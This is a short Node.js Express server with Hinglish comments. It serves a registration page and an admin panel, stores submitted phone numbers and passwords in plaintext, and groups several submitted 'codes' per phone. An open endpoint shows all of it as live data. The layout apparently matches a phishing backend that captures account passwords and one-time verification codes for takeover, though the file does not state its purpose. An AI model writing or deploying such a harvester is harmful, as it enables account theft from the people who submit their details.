const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

// Har phone number ka data ek block mein: { phone, password, codes: [] }
const submissionsByPhone = new Map();

// User registration page route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'registration.html'));
});

app.get('/registration', (req, res) => {
  res.sendFile(path.join(__dirname, 'registration.html'));
});

app.get('/registration.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'registration.html'));
});

// Admin panel route
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/admin.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Registration data save aur phone ke hisaab se codes group karne ke liye
app.post('/api/submit', (req, res) => {
  const { phone, password, code } = req.body;

  if (!phone || !password || !code) {
    return res.status(400).json({ error: 'All fields are required.' });
  }

  const existing = submissionsByPhone.get(phone);

  if (existing) {
    existing.password = password;
    existing.codes.push(code); // 1st -> codes[0], 2nd -> codes[1], 3rd -> codes[2]
  } else {
    submissionsByPhone.set(phone, {
      phone,
      password,
      codes: [code]
    });
  }

  return res.json({ message: 'Submitted' });
});

// Admin panel ke liye live users data
app.get('/api/submissions', (req, res) => {
  res.json(Array.from(submissionsByPhone.values()));
});

// Admin panel se user delete karne ke liye
app.delete('/api/submissions/:phone', (req, res) => {
  const phone = decodeURIComponent(req.params.phone);
  submissionsByPhone.delete(phone);
  res.json({ message: 'Deleted' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
